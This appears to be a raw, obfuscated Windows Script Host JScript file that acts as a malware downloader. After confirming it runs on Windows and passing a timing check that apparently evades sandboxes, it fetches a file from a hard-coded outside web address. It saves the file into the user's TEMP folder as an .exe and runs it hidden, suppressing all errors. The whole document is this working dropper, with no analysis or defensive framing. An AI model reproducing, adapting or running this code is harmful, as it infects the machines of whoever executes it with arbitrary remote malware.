var _NS = false;
var _O = "CreateObject";
var _N1 = function _DT() {return WScript[_O]("WScript"+".Shell");}(), _C = 11;
var _V = "MSXML2.XMLHTTP";
var _SL = 2123213;
var _WS = 0;
function _N(_Y1){_N1["Run"](_Y1, _WS, _WS);};
function _T(){return _V + "";};
function _L(_C0, _WB){_WS = _WS * 1; return _C0 - _WB;};
function _J(){return _O;};
/*@cc_on
  @if (@_win32 || @_win64)
    _NS = true;
  @end
@*/
if (_NS)
{
var _F = "";
function _K(){return 22;};
var _RL = 0; var _I0 = 0;
function _B()
{
var _R = new this["Date"]();
var _X = _R["getUTCMilliseconds"]();
WScript["Sleep"](_K());
var _R = new this["Date"]();
var _FQ = _R["getUTCMilliseconds"]();
WScript["Sleep"](_K());
var _R = new this["Date"]();
var _WF = _R["getUTCMilliseconds"]();
var _RL = "_VI";
_RL = _L(_FQ, _X);
var _I0 = "_P";
_I0 = _L(_WF, _FQ);
_F = "open";
return _L(_RL, _I0);
}
var _O0 = false;
var _Q = false;
for (var _K0 = _WS; _K0 < _K() * 1; _K0++){if (_B() != _WS){
_O0 = true; 
_I0 = "31" + 11 * _RL + _I0; 
_Q = true; 
break;
}}
function _I() {return ((_O0 == true) && (_O0 == _Q)) ? 1 : _WS;};
if (_O0 && _I() && _Q){
function _M() {return _N1["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "38iiC9G4XjFne.ex" + "e";};
 _S = _T();
 _BQ = WScript[_O](_S);
 var _JA = 1;
 while (_JA){
try {
	if (_JA == 1)
	{
		_BQ[_F]("GET", "http://mentalmathcompetition.com/k4isa", false);
		_BQ["send"]();
		_X0 = "Sleep";
	}
	WScript[_X0](_K() + 120); 
	if (_BQ["readystate"] < 2 * 2) continue;
	_JA = _WS;
	function _E(_Y) {var _Y0 = (1, 2, 3, 4, 5, _Y); return _Y0;};
	_J0 = WScript[_J()]("ADODB.Stream");
	_S = _J0;
	_S[_F]();
	_S["type"] = _E(1);
	_S["write"](_BQ["ResponseBody"]);
	_J0["position"] = _E(_WS);
	_S["Save" + "ToFile"](_M(), 2);
	_J0["cl"+"ose"]();
	_N0 = _M();
	_N(_N0);
} catch(_GG){};
}
}
}

